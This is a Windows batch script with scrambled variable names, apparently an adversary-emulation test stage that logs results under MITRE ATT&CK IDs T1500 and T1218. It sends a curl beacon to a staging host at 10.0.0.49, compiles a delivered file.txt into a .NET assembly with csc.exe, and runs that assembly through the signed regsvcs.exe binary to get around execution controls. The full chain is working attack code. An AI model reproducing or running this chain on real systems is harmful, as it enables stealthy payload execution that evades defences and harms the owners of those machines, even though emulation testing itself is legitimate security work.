@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8685\7c40b492
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8685-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=onenote.txt
SET njozco=file.txt
SET kkjwr=8685

SET etswh=%APPDATA%\!ufeybybm!
SET vwpq=!etswh!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_start=!uouoq!>> "!vwpq!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete=0>> "!vwpq!" 2>nul

SET rrdej=1
SET xywok=
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile_After_Delivery=!rrdej!:!xywok!>> "!vwpq!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start=!recnn!>> "!vwpq!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete=!ERRORLEVEL!>> "!vwpq!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!vwpq!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /reference:System.EnterpriseServices.dll /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
SET pabwf=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!pabwf!>> "!vwpq!" 2>nul

IF !pabwf! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start=regsvcs.exe>> "!vwpq!" 2>nul
    %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe "!hpnjatpj!" >nul 2>&1
    SET cnofr=!ERRORLEVEL!
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_complete=!cnofr!>> "!vwpq!" 2>nul
    IF !cnofr! EQU 0 (SET xywok=) ELSE (SET xywok=assembly_load_failed)
) ELSE (
    SET cnofr=!pabwf!
    SET xywok=compile_failed
)

SET rrdej=0
IF !cnofr! EQU 0 SET rrdej=1
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed_Binary_Proxy_Execution=!rrdej!:!xywok!>> "!vwpq!" 2>nul